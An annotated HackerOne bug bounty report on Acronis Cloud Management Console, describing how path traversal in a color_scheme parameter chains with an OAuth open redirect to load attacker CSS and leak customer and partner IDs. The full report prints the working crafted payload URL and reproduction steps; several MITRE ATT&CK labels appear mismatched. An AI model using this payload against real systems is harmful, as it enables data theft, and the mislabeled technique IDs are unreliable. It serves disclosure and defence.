# CSS Injection via Client-Side Path Traversal + Open Redirect Leading to Personal Data Exfiltration on Acronis Cloud

## Metadata
- **Source:** HackerOne
- **Report:** 1245165 | https://hackerone.com/reports/1245165
- **Submitted:** 2021-06-26
- **Reporter:** mr-medi
- **Program:** Acronis
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** CSS Injection, Path Traversal, Open Redirect, Information Disclosure, Attribute-based CSS Exfiltration
- **CVEs:** None
- **Category:** web-api

## Summary
A combination of three vulnerabilities in Acronis Cloud Management Console allows unauthenticated attackers to exfiltrate sensitive personal data. By chaining client-side path traversal in the color_scheme parameter with an open redirect in the OAuth authorize endpoint, attackers can inject malicious CSS from attacker-controlled domains to extract data through CSS attribute selectors. The vulnerability requires no user authentication and only requires a user to visit a crafted link.

## Attack scenario
1. Attacker identifies that the color_scheme GET parameter is used to dynamically load CSS files via path concatenation (theme.PARAMETER.css)
2. Attacker discovers that dots and slashes are not sanitized, allowing relative path traversal (e.g., %2F..%2F..%2F) to navigate to arbitrary endpoints
3. Attacker identifies an open redirect vulnerability in the OAuth authorize endpoint via the state parameter which is reflected without validation
4. Attacker crafts a payload that uses path traversal to reach the authorize endpoint, then exploits open redirect to load attacker-controlled CSS
5. Attacker hosts malicious CSS on their domain containing selectors that exfiltrate DOM content (customer IDs, partner IDs, hashes) via background-image requests
6. Victim visits attacker's crafted URL containing the combined payload, CSS loads and exfiltrates sensitive data from the DOM to attacker's server

## Root cause
Multiple chained vulnerabilities: (1) Insufficient input validation on color_scheme parameter allowing path traversal without sanitizing path separators, (2) Lack of output encoding when constructing CSS file URLs, (3) Open redirect vulnerability in OAuth authorize endpoint via unsanitized state parameter, (4) Lack of Content Security Policy or CSS sandboxing to prevent loading external stylesheets, (5) Sensitive data (customer IDs, partner IDs) exposed in DOM without protection

## Attacker mindset
An attacker recognizes that individual vulnerabilities can be chained together for greater impact. The attacker demonstrates creative vulnerability chaining by combining three separate flaws that individually have limited impact into a powerful data exfiltration attack. The attacker understands browser behavior (CSS redirect following) and DOM structure to maximize data extraction.

## Defensive takeaways
- Implement strict input validation and whitelist allowed values for the color_scheme parameter rather than relying on concatenation with user input
- Sanitize or encode special characters (., /, ..) in user-controlled parameters before using them in file paths
- Validate and sanitize the state parameter in OAuth flows to prevent open redirects; use allowlists for redirect URIs
- Implement Content Security Policy (CSP) headers to restrict stylesheet loading to same-origin or trusted domains only
- Use integrity checks (SRI - Subresource Integrity) for any external resources
- Remove or protect sensitive identifiers from DOM attributes; consider storing in secure, httpOnly cookies instead
- Implement proper redirect validation using allowlists rather than blacklists
- Apply defense-in-depth: validate at multiple layers (client, server, redirect validation)
- Audit all parameters that influence resource loading paths for path traversal vulnerabilities
- Consider using nonce-based CSS loading or requiring CORS headers to prevent cross-origin stylesheet injection

## Variant hunting
Search for other dynamic resource loading patterns (JS, images, fonts) using similar path concatenation vulnerable to traversal
Identify other OAuth or authorization endpoints with unsanitized redirect/state parameters
Look for similar parameter patterns in other Acronis products that concatenate user input into file paths
Test other GET parameters used for theming or customization (skin, theme, style, branding) for path traversal
Check if other endpoints use relative path construction that could be exploited with traversal
Investigate if other applications behind the same domain have exploitable redirects
Search for DOM content that could be exfiltrated through attribute-based CSS selectors on other pages

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing - Link (via malicious URL)
- T1111 - Multi-Stage Channels (chaining vulnerabilities)
- T1012 - Query Registry (DOM enumeration)
- T1020 - Exfiltration Over C2 Channel (via CSS background-image)

## Notes
Report demonstrates sophisticated vulnerability chaining. The attack is particularly dangerous because it requires no authentication and users only need to visit a link. The attacker provided clear technical proof with HTTP request/response evidence. The report mentions a previous related report (#1054406) on CSS injection in branding-scheme.html, suggesting multiple related issues in the application. CSS attribute-based exfiltration is a known but underutilized attack vector that leverages browser behavior of loading background images. The vulnerability specifically affects the beta environment (mc-beta-cloud.acronis.com) but likely affects production as well.

## Full report
<details><summary>Expand</summary>

## Summary

Hi team, I hope everything goes well.
I have found a CSS Injection in Acronis Cloud Management Console`https://mc-beta-cloud.acronis.com/mc` via the `color_scheme` GET parameter.

## Description:

The flow work as I will comment below.

If we go to the URL` https://mc-beta-cloud.acronis.com/mc/?color_scheme=PARAMETER` we can see by looking at the javascript code that it will get the `color_scheme` GET parameter and will make a GET request concatenating the previous value to the URL of the CSS file, in this case is the following URL `https://mc-beta-cloud.acronis.com/mc/theme.PARAMETER.css` to request the CSS file and load it.

You can see it in the following image the request made to load the CSS commented bellow:

{F1354281}

Since the front end doesn't sanitize the values `.` and `/` its possible to perform a `path traversal `to request the CSS file from other path. 
For example, if you go to:
`https://mc-beta-cloud.acronis.com/mc/?color_scheme=%2F..%2F..%2FPARAMETER`

You will notice a GET request is being made to the following URL, confirming the `Relative Path Overwrite` issue:
`https://mc-beta-cloud.acronis.com/PARAMETER.css?v=24.0.10942`

You can see it in the following image too:

{F1354280}


This little issue by itself doesn't appear to be any security issue but if we combine it with a `open redirect` it could be possible to make a request to the vulnerable endpoint to the open redirect and redirect to the domain where the evil CSS file is stored, this attack is possible because when we load any CSS file by default it follows all the redirects specified in the HTTP header `Location`.

While looking at the HTTP requests to see if I could find any open redirect and demonstrate the impact I notice one interesting API endpoint 
`https://mc-beta-cloud.acronis.com/api/2/idp/authorize/?client_id=fb2bf44e-ac14-444a-b2a9-e5e81fe73b80&redirect_uri=%2Fhci%2Fcallback&response_type=code&scope=openid&state=http://localhost&nonce=bhgjuvrrvpwauibleqhvfqat`.
Notice the `state` GET parameter is controllable by the user so we can specify any external domain where to redirect the user.

Let's see the response to the previous request:
{F1354247}

And if we follow the `Location` HTTP header to the endpoint `https://mc-beta-cloud.acronis.com/hci/callback?code=FSNuJgJAWX2HOVFg%3D%3D&state=http://localhost` we can confirm the `Open Redirect` issue:

{F1354248}

I have been digging into it and by creating other account I confirmed that if any user make a request to the first endpoint with the same GET parameters as `client_id`,  `redirect_uri`, `response_type`, `scope`,  `state` and `nonce` it will be redirected to `http://localhost` so once we know that there is no need to guess any user parameter as `client_id` makes the attack more easy because the user only needs to visit a link with a crafted `color_scheme` parameter and the same parameters for the open redirect seen bellow.


Once we confirmed the `Relative Path Overwrite` and `Open Redirect` let's put it all together to make the exploit.
We know that when we load any CSS file it follows all the redirects specified in the HTTP header `Location` so if we are able to overwrite the relative path to the vulnerable Open Redirect endpoint, redirecting the user to the CSS file of my domain we can exfiltrate user personal information by using CSS properties.

By putting together these two tricks if the `color_sheme` have the value:

`%2F..%2F..%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26nonce%3Dbhgjuvrrvpwauibleqhvfqat`

You will notice that the first thing we do in the previous payload is `Overwrite the Relative Path` to the root directory. Then we specify the endpoint vulnerable to the `Open redirect` and in this vulnerable endpoint redirect the user to `http://localhost/core/css.css` where is in my case the evil CSS file stored.
As a result the browser will load it and we can perform the exfiltration of personal data.

The final URL to load the external CSS will looks like this:

`https://mc-beta-cloud.acronis.com/mc/?color_sheme=%2F..%2F..%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26nonce%3Dbhgjuvrrvpwauibleqhvfqat`
Make sure you correctly URL encode it.


In my previous report of CSS Injection #1054406 the vulnerable endpoint is `https://mc-beta-cloud.acronis.com/mc/branding-scheme.html` which is used just to show the final result of the page with some custom style, if you take a look at the `DOM` of the previous URL there is no personal information related so the severity of the issue is reduced but in this scenario is different since the `DOM` have many hash related to the `customer` and `partners` ID's 

In this way, if we specify our CSS file in a domain hosted by us we can perform the CSRF attack via GET requests by loading an external image using CSS properties like background-image or exfiltrate user information like his IP, Referer header or User Agent.
In my explanation I used my local server but you can check it out in any external domain you own.

## Steps To Reproduce

  1- Host the following CSS file in your server, in my example  called it core.css.
```css
html
{
  background-color: black;
  color: green;
}
```
In my case I hosted it in the `css` folder of my local server, so the `state` GET of the payload parameter must be `http://loalhost/css/core.css`
  2- Go to `https://mc-beta-cloud.acronis.com` and login in your Acronis Cloud account as a `partner`.
  3- Finally, go to `https://mc-beta-cloud.acronis.com/mc/?color_sheme=%2F..%2Fapi%2F2%2Fidp%2Fauthorize%2F%3Fclient_id%3Dfb2bf44e-ac14-444a-b2a9-e5e81fe73b80%26redirect_uri%3D%252Fhci%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%26state%3Dhttp%253A%252F%252Flocalhost%252Fcss%252Fcore.css%26nonce%3Dbhgjuvrrvpwauibleqhvfqat` and 

You could see the following CSS injected:

{F1354330}

And the request of the CSS made:

{F1354338}


Best regards and have a nice day,
@mr-medi

## Impact

Data exfiltration via CSS properties as `background-image` its possible as you can see in the following link `https://github.com/maxchehab/CSS-Keylogging/`.

I will dig to see what more information about the user I can exfiltrate apart from the Hashes of partners and customer accounts.

</details>

---
*Analysed by Claude on 2026-05-12*
